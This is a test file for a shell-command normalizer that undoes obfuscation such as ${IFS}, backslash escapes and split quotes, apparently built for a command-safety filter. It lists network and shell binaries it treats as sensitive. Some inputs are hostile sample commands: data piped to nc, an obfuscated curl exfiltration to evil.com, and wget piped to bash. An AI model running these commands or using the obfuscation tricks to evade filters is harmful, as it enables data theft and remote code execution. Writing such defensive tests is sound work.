import { describe, it, expect } from 'bun:test';
import { normalizeCommand } from '../normalize.js';

describe('normalize module', () => {
  // SENSITIVE_BINARIES is internal — verify the known binaries by testing
  // that their paths get stripped during normalization.
  describe('sensitive binary path stripping (via behavior)', () => {
    const KNOWN_SENSITIVE = [
      'curl', 'wget', 'nc', 'ncat', 'netcat', 'fetch', 'aria2c',
      'scp', 'rsync', 'sftp', 'nslookup', 'dig', 'host', 'drill', 'git',
      'pip', 'pip3', 'npm', 'pnpm', 'yarn', 'npx', 'bunx', 'uvx', 'pipx',
      'cargo', 'gem', 'python', 'python2', 'python3', 'ruby', 'perl',
      'node', 'deno', 'php', 'pwsh', 'powershell',
      'bash', 'sh', 'zsh', 'dash', 'ash', 'ksh',
      'apt', 'apt-get', 'dnf', 'yum', 'pacman', 'brew', 'conda',
    ];

    for (const binary of KNOWN_SENSITIVE) {
      it(`strips path prefix from /usr/bin/${binary}`, () => {
        const cmd = `/usr/bin/${binary} --help`;
        const result = normalizeCommand(cmd);
        // The normalized command should contain the bare binary name
        expect(result).toContain(binary);
        // And should not have the full path (or at least the basename is preserved)
        expect(result).not.toContain(`/usr/bin/${binary}`);
      });
    }

    it('does not strip paths for non-sensitive binaries', () => {
      const cmd = '/bin/echo hello';
      const result = normalizeCommand(cmd);
      // "echo" is not a sensitive binary, so the path stays intact
      expect(result).toContain('/bin/echo');
    });
  });

  describe('normalizeCommand — fast path (no special chars)', () => {
    it('returns command unchanged when no special characters present', () => {
      const cmd = 'ls -la /home/user';
      // Note: "/" IS a trigger character, so this won't take the fast path.
      // Let's use a command with truly no special chars.
      expect(normalizeCommand('echo hello')).toBe('echo hello');
    });

    it('returns simple echo command unchanged', () => {
      const cmd = 'echo hello world';
      expect(normalizeCommand(cmd)).toBe(cmd);
    });

    it('returns git status unchanged (no special chars)', () => {
      const cmd = 'git status';
      expect(normalizeCommand(cmd)).toBe(cmd);
    });

    // The fast path checks for: \ $ ' " /
    it('triggers normalization on backslash', () => {
      const cmd = 'echo hello\\nworld';
      const result = normalizeCommand(cmd);
      expect(result).not.toBe(cmd);
    });

    it('triggers normalization on dollar sign', () => {
      const cmd = 'echo $HOME';
      const result = normalizeCommand(cmd);
      // May or may not change depending on IFS_RE match; just verify no crash
      expect(typeof result).toBe('string');
    });

    it('triggers normalization on single quote', () => {
      const cmd = "echo 'hello'";
      const result = normalizeCommand(cmd);
      expect(typeof result).toBe('string');
    });

    it('triggers normalization on double quote', () => {
      const cmd = 'echo "hello"';
      const result = normalizeCommand(cmd);
      expect(typeof result).toBe('string');
    });

    it('triggers normalization on forward slash (path)', () => {
      const cmd = '/usr/bin/curl http://example.com';
      const result = normalizeCommand(cmd);
      // PATH_BASENAME_RE should strip the directory prefix
      expect(result).toContain('curl');
    });
  });

  describe('normalizeCommand — line continuation removal', () => {
    it('removes backslash-newline continuations', () => {
      const cmd = 'echo hello \\\nworld';
      const result = normalizeCommand(cmd);
      expect(result).not.toContain('\\\n');
      expect(result).toContain('hello world');
    });

    it('handles multiple line continuations', () => {
      const cmd = 'curl http://example.com \\\n  -o output.txt \\\n  --silent';
      const result = normalizeCommand(cmd);
      expect(result).not.toContain('\\\n');
    });
  });

  describe('normalizeCommand — backslash escape removal', () => {
    it('removes backslash before alphanumeric characters', () => {
      const cmd = 'echo \\h\\e\\l\\l\\o';
      const result = normalizeCommand(cmd);
      expect(result).toBe('echo hello');
    });

    it('preserves backslash before non-alphanumeric characters', () => {
      // BACKSLASH_ESCAPE_RE only matches \([A-Za-z0-9_])
      const cmd = 'echo \\$HOME';
      const result = normalizeCommand(cmd);
      // The \$ should remain since $ is not in [A-Za-z0-9_]
      expect(result).toContain('\\$');
    });

    it('removes backslash before underscore', () => {
      const cmd = 'echo \\_variable';
      const result = normalizeCommand(cmd);
      expect(result).toBe('echo _variable');
    });
  });

  describe('normalizeCommand — IFS obfuscation removal', () => {
    it('replaces ${IFS} with space', () => {
      const cmd = 'curl${IFS}-X${IFS}POST';
      const result = normalizeCommand(cmd);
      expect(result).toContain('curl -X POST');
    });

    it('replaces $IFS with space', () => {
      const cmd = 'nc$IFS-e$/bin/sh';
      const result = normalizeCommand(cmd);
      // $IFS becomes a space; the rest stays
      expect(result).toContain('nc ');
    });

    it('handles ${IFS_} variant (not matched by IFS_RE)', () => {
      // IFS_RE matches $\{IFS(?![A-Za-z0-9_]) or $IFS\b
      // ${IFS_} has an underscore after IFS, so the negative lookahead fails
      const cmd = 'echo${IFS_}hello';
      const result = normalizeCommand(cmd);
      expect(result).toBe(cmd);
    });
  });

  describe('normalizeCommand — empty quote removal', () => {
    it('removes empty double quotes', () => {
      const cmd = 'curl ""http://example.com""';
      const result = normalizeCommand(cmd);
      // The EMPTY_QUOTES_RE removes "" pairs
      expect(result).not.toContain('""');
    });

    it('removes empty single quotes', () => {
      const cmd = "echo ''hello''";
      const result = normalizeCommand(cmd);
      expect(result).not.toContain("''");
    });
  });

  describe('normalizeCommand — intra-word quote removal', () => {
    it('removes quotes between word characters', () => {
      // INTRAWORD_QUOTE_RE matches ' or " when preceded and followed by \w
      const cmd = "echo hel'lo";
      const result = normalizeCommand(cmd);
      expect(result).toBe("echo hello");
    });

    it('removes double quotes between word characters', () => {
      const cmd = 'echo hel"lo';
      const result = normalizeCommand(cmd);
      expect(result).toBe('echo hello');
    });
  });

  describe('normalizeCommand — path basename extraction for sensitive binaries', () => {
    it('strips directory prefix from /usr/bin/curl', () => {
      const cmd = '/usr/bin/curl http://example.com';
      const result = normalizeCommand(cmd);
      // PATH_BASENAME_RE captures the binary name and removes the path
      expect(result).toContain('curl');
    });

    it('strips directory prefix from /bin/bash', () => {
      const cmd = '/bin/bash -c "echo hello"';
      const result = normalizeCommand(cmd);
      expect(result).toContain('bash');
    });

    it('strips directory prefix from python3', () => {
      const cmd = '/usr/local/bin/python3 script.py';
      const result = normalizeCommand(cmd);
      expect(result).toContain('python3');
    });

    it('handles quoted path to sensitive binary', () => {
      const cmd = '"/usr/bin/wget" http://example.com/file.txt';
      const result = normalizeCommand(cmd);
      expect(result).toContain('wget');
    });

    it('does not strip paths for non-sensitive binaries', () => {
      // "echo" is not in SENSITIVE_BINARIES, so its path (if any) stays
      const cmd = '/bin/echo hello';
      const result = normalizeCommand(cmd);
      expect(result).toContain('/bin/echo');
    });

    it('handles binary at start of command', () => {
      const cmd = 'curl http://example.com';
      const result = normalizeCommand(cmd);
      expect(result).toBe('curl http://example.com');
    });

    it('handles binary after semicolon', () => {
      const cmd = 'ls; curl http://example.com';
      const result = normalizeCommand(cmd);
      expect(result).toContain('curl');
    });

    it('handles binary after pipe', () => {
      const cmd = 'echo data | nc 10.0.0.1 4444';
      const result = normalizeCommand(cmd);
      expect(result).toContain('nc');
    });
  });

  describe('normalizeCommand — combined obfuscation scenarios', () => {
    it('handles path + IFS + line continuation together', () => {
      const cmd = '/usr/bin/curl${IFS}-X${IFS}POST \\\n  http://example.com';
      const result = normalizeCommand(cmd);
      expect(result).toContain('curl');
      expect(result).not.toContain('\\\n');
    });

    it('handles backslash escapes + empty quotes together', () => {
      const cmd = 'echo \\h\\e""llo';
      const result = normalizeCommand(cmd);
      // Backslashes removed, empty quotes removed
      expect(result).toBe('echo hello');
    });

    it('handles a realistic obfuscated exfil command', () => {
      const cmd = '/usr/bin/curl${IFS}-d${IFS}"data"\\${IFS}http://evil.com';
      const result = normalizeCommand(cmd);
      expect(result).toContain('curl');
    });

    it('handles pipe-to-shell obfuscation', () => {
      const cmd = 'wget http://evil.com/script.sh | /bin/bash';
      const result = normalizeCommand(cmd);
      expect(result).toContain('wget');
      expect(result).toContain('bash');
    });
  });

  describe('normalizeCommand — fail-open on malformed input', () => {
    it('handles empty string without crashing', () => {
      expect(() => normalizeCommand('')).not.toThrow();
      expect(normalizeCommand('')).toBe('');
    });

    it('handles very long command without crashing', () => {
      const longCmd = 'echo ' + 'x'.repeat(1_000_000);
      expect(() => normalizeCommand(longCmd)).not.toThrow();
    });

    it('returns original command on internal error', () => {
      // The function wraps everything in try/catch returning the original command
      const cmd = 'echo hello';
      const result = normalizeCommand(cmd);
      expect(typeof result).toBe('string');
    });

    it('handles null-like input gracefully via fast path', () => {
      // Empty string has no special chars, so fast path returns it unchanged
      expect(normalizeCommand('')).toBe('');
    });
  });

  describe('normalizeCommand — idempotency', () => {
    it('normalizing twice produces same result as once', () => {
      const cmd = '/usr/bin/curl${IFS}-X${IFS}POST http://example.com';
      const once = normalizeCommand(cmd);
      const twice = normalizeCommand(once);
      expect(twice).toBe(once);
    });

    it('normalizing a clean command is idempotent', () => {
      const cmd = 'ls -la /home/user';
      const once = normalizeCommand(cmd);
      const twice = normalizeCommand(once);
      expect(twice).toBe(once);
    });
  });
});
